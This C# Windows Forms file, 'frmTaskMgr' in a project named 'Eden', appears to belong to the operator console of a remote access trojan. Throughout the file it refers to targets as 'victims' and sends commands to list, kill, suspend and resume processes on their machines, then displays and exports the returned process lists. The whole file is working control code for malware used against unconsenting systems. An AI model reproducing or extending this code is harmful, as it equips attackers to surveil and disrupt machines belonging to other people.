using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Text;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmTaskMgr : Form
    {
        private clsVictim m_victim;
        public string m_szVictimID;

        public frmTaskMgr(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
            m_szVictimID = victim.m_szID;

            Text = $@"Process\\{m_szVictimID}";
        }

        void fnRecv(clsClient clnt, string szVictimID, List<string> lsMsg)
        {
            if (!string.Equals(szVictimID, m_szVictimID))
                return;

            if (lsMsg[0] == "proc")
            {
                if (lsMsg[1] == "ls")
                {
                    int nCode = int.Parse(lsMsg[2]);
                    if (nCode == 0)
                    {
                        MessageBox.Show(EZCrypto.Encoder.b64d2str(lsMsg[3]));
                        return;
                    }

                    var ls = clsTools.EZData.String2TwoDList(lsMsg[3]);
                    foreach (var x in ls)
                    {
                        ListViewItem item = new ListViewItem(x.First());
                        for (int i = 1; i < x.Count; i++)
                            item.SubItems.Add(x[i]);

                        Invoke(new Action(() =>
                        {
                            listView1.Items.Add(item);
                        }));
                    }

                    Invoke(() => toolStripStatusLabel1.Text = $"Process[{listView1.Items.Count}]");
                }
                else if (lsMsg[1] == "kill")
                {
                    int nCode = int.Parse(lsMsg[2]);
                    int nPid = int.Parse(lsMsg[3]);

                    Invoke(new Action(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Kill process failed."));
                }
                else if (lsMsg[1] == "suspend")
                {
                    int nCode = int.Parse(lsMsg[2]);
                    int nPid = int.Parse(lsMsg[3]);

                    Invoke(new Action(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Suspend process failed."));
                }
                else if (lsMsg[1] == "resume")
                {
                    int nCode = int.Parse(lsMsg[2]);
                    int nPid = int.Parse(lsMsg[3]);

                    Invoke(new Action(() => toolStripStatusLabel1.Text = nCode == 1 ? "Action successfully." : "Resume process failed."));
                }
            }
        }

        void fnGetProcesses()
        {
            listView1.Items.Clear();
            toolStripStatusLabel1.Text = "Loading...";

            m_victim.fnSendCommand(new string[]
            {
                "Process",
                "ls",
            });
        }

        void fnSetup()
        {
            m_victim.m_clnt.ServerMessageReceived += fnRecv;

            StartPosition = FormStartPosition.CenterScreen;
            listView1.View = View.Details;
            listView1.FullRowSelect = true;
            listView1.MultiSelect = true;

            listView1.Columns.Add("Pid", 50);
            listView1.Columns.Add("Name", 150);
            listView1.Columns.Add("Status", 120);
            listView1.Columns.Add("PPid", 50);
            listView1.Columns.Add("uid", 50);
            listView1.Columns.Add("VmRSS", 120);
            listView1.Columns.Add("VmSize", 120);
            listView1.Columns.Add("CmdLine", 200);
            listView1.Columns.Add("uTime", 120);
            listView1.Columns.Add("sTime", 120);

            listView1.ContextMenuStrip = contextMenuStrip1;

            ToolStripMenuItem itemAll = new ToolStripMenuItem("All");
            itemAll.Click += (s, e) =>
            {
                StringBuilder sb = new StringBuilder();
                foreach (ListViewItem item in listView1.SelectedItems)
                    sb.AppendLine(string.Join(",", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text)));

                Clipboard.SetText(sb.ToString());
                toolStripStatusLabel1.Text = "Clipboard set text successfully.";
            };

            toolStripMenuItem1.DropDownItems.Add(itemAll);
            toolStripMenuItem1.DropDownItems.Add(new ToolStripSeparator());

            for (int i = 0; i < listView1.Columns.Count; i++)
            {
                ColumnHeader column = listView1.Columns[i];
                ToolStripMenuItem item = new ToolStripMenuItem(column.Text);

                item.Click += (s, e) =>
                {
                    List<ListViewItem> items = listView1.SelectedItems.Cast<ListViewItem>().ToList();
                    if (items.Count == 0)
                        return;

                    int nIdx = i;
                    string szContext = string.Join("\n", items.Select(x => x.SubItems[i].Text));

                    Clipboard.SetText(szContext);
                    toolStripStatusLabel1.Text = "Clipboard set text successfully.";
                };

                toolStripMenuItem1.DropDownItems.Add(item);
            }

            fnGetProcesses();
        }

        private void frmTaskMgr_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmTaskMgr_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_clnt.ServerMessageReceived -= fnRecv;
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {

        }

        //Kill
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                m_victim.fnSendCommand(new string[]
                {
                    "Process",
                    "kill",
                    item.Text,
                });
            }
        }

        //Suspend
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                m_victim.fnSendCommand(new string[]
                {
                    "Process",
                    "suspend",
                    item.Text,
                });
            }
        }

        //Resume
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                m_victim.fnSendCommand(new string[]
                {
                    "Process",
                    "resume",
                    item.Text,
                });
            }
        }

        //Refresh
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            fnGetProcesses();
        }

        //Export
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    StringBuilder sb = new StringBuilder();
                    sb.AppendLine(string.Join(",", listView1.Columns.Cast<ColumnHeader>().Select(x => x.Text)));
                    foreach (ListViewItem item in listView1.Items)
                        sb.AppendLine(string.Join(",", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text)));

                    File.WriteAllText(sfd.FileName, sb.ToString());

                    MessageBox.Show("Save file successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.A)
                {
                    listView1.Items.Cast<ListViewItem>().ToList().ForEach(x => x.Selected = true);
                }
                else if (e.KeyCode == Keys.S)
                {
                    SaveFileDialog sfd = new SaveFileDialog();
                    if (sfd.ShowDialog() == DialogResult.OK)
                    {
                        try
                        {
                            StringBuilder sb = new StringBuilder();
                            sb.AppendLine(string.Join(",", listView1.Columns.Cast<ColumnHeader>().Select(x => x.Text)));
                            foreach (ListViewItem item in listView1.Items)
                                sb.AppendLine(string.Join(",", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text)));

                            File.WriteAllText(sfd.FileName, sb.ToString());

                            MessageBox.Show("Save file successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                }
            }
            else
            {
                if (e.KeyCode == Keys.F5)
                {
                    fnGetProcesses();
                }
            }
        }
    }
}
